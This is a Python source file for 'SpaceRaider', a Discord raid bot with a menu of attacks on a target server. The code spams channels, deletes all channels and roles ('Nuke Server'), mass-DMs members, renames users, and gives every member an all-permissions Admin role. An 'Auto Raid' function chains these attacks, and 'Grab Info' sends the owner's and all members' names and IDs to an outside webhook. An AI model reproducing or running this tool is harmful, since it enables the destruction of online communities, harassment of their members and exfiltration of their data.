import requests as req
import getpass
import os
import random
import urllib.request
import asyncio
import discord
from config import *
import tracemalloc
import time
import logging
from discord import Activity, ActivityType
from discord.ext import commands

os.system('cls')
tracemalloc.start()
reset = "\033[0m"
os.system('title SpaceRaider')
username_pc = getpass.getuser()
purple = "\033[38;2;147;112;219m"
priced = "Free"
version = "1.0.0"
created = "TheJurmik"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

os.system('cls')

async def menu(server_id):
    await asyncio.sleep(1)
    os.system('cls')
    choice = input(f'''{purple}
  _________                        __________        ___    ___              
 /   _____/___________  _____  ____\______   \_____  |__| __| |____________    
 \_____  \_____ \___  \/  ___\/ __ \|       _/\__  \ |  |/ __ |/ __ \_  __ \      
 /        \  |_> > __  \  \__\  ___/|    |   \ / __ \|  / /_/ |  ___/|  | \/   
/_______  /   __(____  /\___  \___  \____|_  /(____  /__\____ |\___  |__|      
        \/|__|       \/     \/    \/       \/      \/        \/    \/                       

    {purple}┌─Made by {reset}{created} {purple}Version {reset}{version} {purple}{priced}

  {reset}1 {purple}► {reset}Message Spammer {purple} {reset}7 {purple}► {reset}Change Server {purple}
  {reset}2 {purple}► {reset}Create Channels {purple} {reset}8 {purple}► {reset}Nick Changer {purple}
  {reset}3 {purple}► {reset}Remove Channels {purple} {reset}9 {purple}► {reset}Admin Giver {purple}
  {reset}4 {purple}► {reset}Mass Dm Server {purple}  {reset}10 {purple}► {reset}Auto Raid {purple}
  {reset}5 {purple}► {reset}Role Creator {purple}    {reset}11 {purple}► {reset}Grab Info {purple}
  {reset}6 {purple}► {reset}Nuke Server {purple}

    {purple}└─(SpaceAccount)─[{username_pc}]─[~] {reset}''')
    await asyncio.sleep(0.5)
    if choice == "1":
        os.system('cls')
        await spam_channels(server_id)
    elif choice == "2":
        os.system('cls')
        await create_channels(server_id)
    elif choice == "3":
        os.system('cls')
        await remove_channels(server_id)
    elif choice == "6":
        os.system('cls')
        await nuke(server_id)
    elif choice == "9":
        os.system('cls')
        await get_admin(server_id)
    elif choice == "7":
        os.system('cls')
        await change_server(server_id)
    elif choice == "5":
        os.system('cls')
        await create_role(server_id)
    elif choice == "4":
        os.system('cls')
        await dm_all(server_id)
    elif choice == "8":
        os.system('cls')
        await nick_changer(server_id)
    elif choice == "10":
        os.system('cls')
        await auto_raid(server_id)
    elif choice == "11":
        os.system('cls')
        await grab_info(server_id)
    else:
        print()
        print(f'    {purple} ► {reset}Wrong choice')
        await asyncio.sleep(1)
        await menu(server_id)

@bot.event
async def on_ready():
    try:
        start = True
        os.system('cls')
        print()
        server_id = input(f"{purple} ► {reset}Enter server id {purple}")
        server = bot.get_guild(int(server_id))
        if server:
          print()
          print(f'{purple} ► {reset}Bot is on server {purple}({server.name})')
          presence_type = getattr(ActivityType, status_type)
          await bot.change_presence(activity=Activity(type=presence_type, name=status))
          await menu(server_id)
    except Exception as e:
        print()
        print(f'{purple} ► {reset}Wrong id or bot is not on the server {purple}')
        await asyncio.sleep(10)
        await menu(server_id)

def log_message(message):
    print(message)

async  def grab_info(server_id):
    guild = bot.get_guild(int(server_id))
    try:
        data = {
            "content": f"Name: {guild.name}, Description: {guild.description}, Owner: {guild.owner}",
            "username": "SpaceRaider"
        }
        result = req.post(grabwebhook, json=data)
        for member in guild.members:
            data = {
                "content": f"Member: {member}, ID: {member.id}",
                "username": "SpaceRaider"
            }
            result = req.post(grabwebhook, json=data)
    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple}{e}")
        await asyncio.sleep(10)
        await menu(server_id)
    await asyncio.sleep(2)
    await menu(server_id)

async def auto_raid(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()

            channel_futures = [delete_channel(channel) for channel in guild.channels]
            role_futures = [delete_role(role) for role in guild.roles]

            role_results = await asyncio.gather(*role_futures)
            channel_results = await asyncio.gather(*channel_futures)
            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)
            roles_deleted = role_results.count(True)
            roles_not_deleted = role_results.count(False)

        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(1)
            await menu(server_id)

    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple}{e}")
        await asyncio.sleep(10)
        await menu(server_id)
    try:
        guild = bot.get_guild(int(server_id))
        if guild:

            if channel_type not in ['text', 'voice']:
                print(f"    {purple} ► {reset}Invalid channel type {purple}")
                await asyncio.sleep(1)
                await menu(server_id)

            channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]

            start_time_total = time.time()
            channel_results = await asyncio.gather(*channel_futures)
            end_time_total = time.time()

            channels_created = channel_results.count(True)
            channels_not_created = channel_results.count(False)

        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(1)
            await menu(server_id)
    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple} {e}")
        await asyncio.sleep(10)
        await menu(server_id)
    try:
        guild = bot.get_guild(int(server_id))
        if guild:

            num_messages = int(NUM_MESSAGE['num_messages'])
            start_time_total = time.time()
            tasks = [
                send_messages_to_channel(channel, num_messages, False)
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

        else:
            log_message(f"    {purple} ► {reset}Guild not found {purple}")
            await asyncio.sleep(1)
            await menu(server_id)

    except Exception as e:
        log_message(f"    {purple} ► {reset}Error {purple}{e}")
        await asyncio.sleep(10)
        await menu(server_id)
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_guild_changer = time.time()
            await guild.edit(name=new_name)
            print(f"    {purple} ► {reset}Server name changed {purple}")

            if new_icon:
                with urllib.request.urlopen(new_icon) as response:
                    icon_data = response.read()
                await guild.edit(icon=icon_data)
                print(f"    {purple} ► {reset}Icon changed {purple}")

            await guild.edit(description=new_description)
            print(f"    {purple} ► {reset}Description changed")
            end_time_guild_changer = time.time()

        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(1)
            await menu(server_id)
    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple}{e}")
        await asyncio.sleep(1)
        await menu(server_id)
    try:
        guild = bot.get_guild(int(server_id))
        for member in guild.members:
            try:
                if not member.bot:
                    nick_changed = random.choice(name_nick)
                    await member.edit(nick=nick_changed)
                    print(f"    {purple} ► {reset}Nickname of {member} changed {purple}")
            except Exception as e:
                print(f"    {purple} ► {reset}Error {purple} {e}")

    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple} {e}")
        await asyncio.sleep(5)
        await menu(server_id)
    try:
        guild = bot.get_guild(int(server_id))
        if guild:

            members_sent = 0
            members_fail = 0
            message = random.choice(message_content)

            start_time_total = time.time()
            for member in guild.members:
                if not member.bot:
                    try:
                        start_time_member = time.time()
                        await member.send(message)
                        end_time_member = time.time()
                        print(f"    {purple} ► {reset}Message sent to {purple}{member.name} ({member.id}){reset} Time taken {purple}{end_time_member - start_time_member:.2f} {reset}seconds")
                        members_sent += 1
                    except Exception as e:
                        print(f"    {purple} ► {reset}Cant send the message{purple} {e}")
                        members_fail += 1

            end_time_total = time.time()
        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(2)
            await menu(server_id)
    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple} {e}")
        await asyncio.sleep(5)
        await menu(server_id)
    try:
        guild = bot.get_guild(int(server_id))
        if guild:

            roles_created = 0

            start_time_total = time.time()
            for _ in range(num_roles):
                try:
                    start_time_role = time.time()
                    color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

                    role = random.choice(role_name)
                    new_role = await guild.create_role(name=role, colour=color)
                    end_time_role = time.time()
                    print(f"    {purple} ► {reset}Created role {purple}{new_role.name} ({new_role.id}){reset} Time taken {purple}{end_time_role - start_time_role:.2f} {purple}seconds")
                    roles_created += 1
                except Exception as e:
                    print(f"    {purple} ► {reset}Cant create role {purple} {e}")
                    await asyncio.sleep(3)
                    await menu(server_id)

            end_time_total = time.time()
        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(2)
            await menu(server_id)
    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple}{e}")
        await asyncio.sleep(10)
        await menu(server_id)
    try:
        guild = bot.get_guild(int(server_id))
        if guild:

            color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

            start_time_total = time.time()

            admin_role = await guild.create_role(name="Admin", colour=color, permissions=discord.Permissions.all())
            for member in guild.members:
                try:
                    if not member.bot:
                        start_time_member = time.time()
                        await member.add_roles(admin_role)
                        end_time_member = time.time()
                        print(f"    {purple} ► {reset}Admin role granted to {purple}{member.name} {reset}Time taken {purple}{end_time_member - start_time_member:.2f} {reset}seconds")

                except Exception as e:
                    print(f"    {purple} ► {reset}Error {purple} {e}")
                    await asyncio.sleep(10)
                    await menu(server_id)

        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(2)
            await menu(server_id)

    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple} {e}")
        await asyncio.sleep(10)
        await menu(server_id)

    await asyncio.sleep(5)
    await menu(server_id)

async def nick_changer(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        for member in guild.members:
            try:
                if not member.bot:
                    nick_changed = random.choice(name_nick)
                    await member.edit(nick=nick_changed)
                    print(f"    {purple} ► {reset}Nickname of {member} changed {purple}")
            except Exception as e:
                print(f"    {purple} ► {reset}Error {purple} {e}")

        await asyncio.sleep(5)
        await menu(server_id)

    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple} {e}")
        await asyncio.sleep(5)
        await menu(server_id)

async def dm_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:

            members_sent = 0
            members_fail = 0
            message = random.choice(message_content)

            start_time_total = time.time()
            for member in guild.members:
                if not member.bot:
                    try:
                        start_time_member = time.time()
                        await member.send(message)
                        end_time_member = time.time()
                        print(f"    {purple} ► {reset}Message sent to {purple}{member.name} ({member.id}){reset} Time taken {purple}{end_time_member - start_time_member:.2f} {reset}seconds")
                        members_sent += 1
                    except Exception as e:
                        print(f"    {purple} ► {reset}Cant send the message{purple} {e}")
                        members_fail += 1

            end_time_total = time.time()
            await asyncio.sleep(2)
            await menu(server_id)
        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(2)
            await menu(server_id)
    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple} {e}")
        await asyncio.sleep(5)
        await menu(server_id)

async def create_role(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:

            roles_created = 0

            start_time_total = time.time()
            for _ in range(num_roles):
                try:
                    start_time_role = time.time()
                    color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

                    role = random.choice(role_name)
                    new_role = await guild.create_role(name=role, colour=color)
                    end_time_role = time.time()
                    print(f"    {purple} ► {reset}Created role {purple}{new_role.name} ({new_role.id}){reset} Time taken {purple}{end_time_role - start_time_role:.2f} {purple}seconds")
                    roles_created += 1
                except Exception as e:
                    print(f"    {purple} ► {reset}Cant create role {purple} {e}")
                    await asyncio.sleep(3)
                    await menu(server_id)

            end_time_total = time.time()
            await asyncio.sleep(1)
            await menu(server_id)
        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(2)
            await menu(server_id)
    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple}{e}")
        await asyncio.sleep(10)
        await menu(server_id)

async def change_server(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_guild_changer = time.time()
            await guild.edit(name=new_name)
            print(f"    {purple} ► {reset}Server name changed {purple}")

            if new_icon:
                with urllib.request.urlopen(new_icon) as response:
                    icon_data = response.read()
                await guild.edit(icon=icon_data)
                print(f"    {purple} ► {reset}Icon changed {purple}")

            await guild.edit(description=new_description)
            print(f"    {purple} ► {reset}Description changed")
            end_time_guild_changer = time.time()
            await asyncio.sleep(2)
            await menu(server_id)

        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(1)
            await menu(server_id)
    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple}{e}")
        await asyncio.sleep(1)
        await menu(server_id)

async def get_admin(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            user_id_or_all = input(f"    {purple} ► {reset}User id / Enter for all members {purple}")

            color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

            start_time_total = time.time()

            admin_role = await guild.create_role(name="Admin", colour=color, permissions=discord.Permissions.all())

            if not user_id_or_all:
                for member in guild.members:
                    try:
                        if not member.bot:
                            start_time_member = time.time()
                            await member.add_roles(admin_role)
                            end_time_member = time.time()
                            print(f"    {purple} ► {reset}Admin role granted to {purple}{member.name} {reset}Time taken {purple}{end_time_member - start_time_member:.2f} {reset}seconds")
                    except Exception as e:
                        print(f"    {purple} ► {reset}Error {purple} {e}")
                        await asyncio.sleep(10)
                        await menu(server_id)
                end_time_total = time.time()
                await asyncio.sleep(1)
                await menu(server_id)

            else:
                try:
                    user_id = int(user_id_or_all)
                    target_user = await guild.fetch_member(user_id)
                    if target_user:
                        start_time_target_user = time.time()
                        await target_user.add_roles(admin_role)
                        end_time_target_user = time.time()
                        print(f"    {purple} ► {reset}Admin role granted to {purple}{target_user.name} {reset}Time taken {purple}{end_time_target_user - start_time_target_user:.2f} {reset}seconds")
                        await asyncio.sleep(2)
                        await menu(server_id)
                    else:
                        print(f"    {purple} ► {reset}User with id not found {purple}")
                        await asyncio.sleep(2)
                        await menu(server_id)

                except ValueError:
                    print(f"    {purple} ► {reset}Invalid user id {purple}")
                    await asyncio.sleep(3)
                    await menu(server_id)
        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(2)
            await menu(server_id)
    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple} {e}")
        await asyncio.sleep(10)
        await menu(server_id)

async def nuke(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()

            channel_futures = [delete_channel(channel) for channel in guild.channels]
            role_futures = [delete_role(role) for role in guild.roles]

            role_results = await asyncio.gather(*role_futures)
            channel_results = await asyncio.gather(*channel_futures)
            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)
            roles_deleted = role_results.count(True)
            roles_not_deleted = role_results.count(False)

            await asyncio.sleep(1)
            await menu(server_id)
        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(1)
            await menu(server_id)

    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple}{e}")
        await asyncio.sleep(10)
        await menu(server_id)

async def delete_role(role):
    try:
        start_time = time.time()
        await role.delete()
        end_time = time.time()
        log_message(f"    {purple} ► {reset}Role {purple}{role.name} {reset}deleted, Time taken {purple}{end_time - start_time:.2f} {reset}seconds")
        return True
    except Exception as e:
        log_message(f"    {purple} ► {reset}Cant delete role {purple}{e}")
        return False

async def delete_channel(channel):
    try:
        start_time = time.time()
        await channel.delete()
        end_time = time.time()
        log_message(f"    {purple} ► {reset}Channel {purple}{channel.name} {reset}deleted, Time taken {purple}{end_time - start_time:.2f} {reset}seconds")
        return True
    except Exception as e:
        log_message(f"    {purple} ► {reset}Cant delete channel {purple}{channel.name}: {e}")
        return False

async def remove_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()
            channel_futures = [delete_channel(channel) for channel in guild.channels]

            channel_results = await asyncio.gather(*channel_futures)
            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)

            await asyncio.sleep(1)
            await menu(server_id)
        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(1)
            await menu(server_id)
    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple}{e}")
        await asyncio.sleep(10)
        await menu(server_id)

async def create_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:

            if channel_type not in ['text', 'voice']:
                print(f"    {purple} ► {reset}Invalid channel type {purple}")
                await asyncio.sleep(1)
                await menu(server_id)

            channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]

            start_time_total = time.time()
            channel_results = await asyncio.gather(*channel_futures)
            end_time_total = time.time()

            channels_created = channel_results.count(True)
            channels_not_created = channel_results.count(False)

            await asyncio.sleep(1)
            await menu(server_id)
        else:
            print(f"    {purple} ► {reset}Server not found {purple}")
            await asyncio.sleep(1)
            await menu(server_id)
    except Exception as e:
        print(f"    {purple} ► {reset}Error {purple} {e}")
        await asyncio.sleep(10)
        await menu(server_id)

async def create_channel(guild, channel_type, channel_name):
    try:
        start_time = time.time()
        channel = random.choice(channel_name)
        if channel_type == 'text':
            new_channel = await guild.create_text_channel(channel)
        elif channel_type == 'voice':
            new_channel = await guild.create_voice_channel(channel)

        end_time = time.time()
        log_message(f"    {purple} ► {reset}Channel created {purple} {new_channel.name} ({new_channel.id}) {reset}Time taken {purple}{end_time - start_time:.2f} {reset}seconds")
        return new_channel

    except Exception as e:
        log_message(f"    {purple} ► {reset}Channel error {purple}{e}")
        return None

async def send_messages_to_channel(channel, num_messages, include_everyone):
    try:
        for i in range(num_messages):
            content = random.choice(message_content)
            await channel.send(content)
            log_message(f"    {purple} ► {reset}Message {purple}{i + 1}/{num_messages} {reset}sent to channel {purple}{channel.name}")
        return True
    except Exception as e:
        log_message(f"    {purple} ► {reset}Cant send message to a channel {purple}{channel.name} {e}")
        return False

async def spam_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:

            num_messages = int(NUM_MESSAGE['num_messages'])
            start_time_total = time.time()
            tasks = [
                send_messages_to_channel(channel, num_messages, False)
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            await asyncio.sleep(1)
            os.system('cls')
            await menu(server_id)
        else:
            log_message(f"    {purple} ► {reset}Guild not found {purple}")
            await asyncio.sleep(1)
            os.system('cls')
            await menu(server_id)

    except Exception as e:
        log_message(f"    {purple} ► {reset}Error {purple}{e}")
        await asyncio.sleep(10)
        os.system('cls')
        await menu(server_id)

os.system('cls')
if __name__ == "__main__":
    logging.getLogger('discord.gateway').setLevel(logging.ERROR)
    bot.run(bot_token)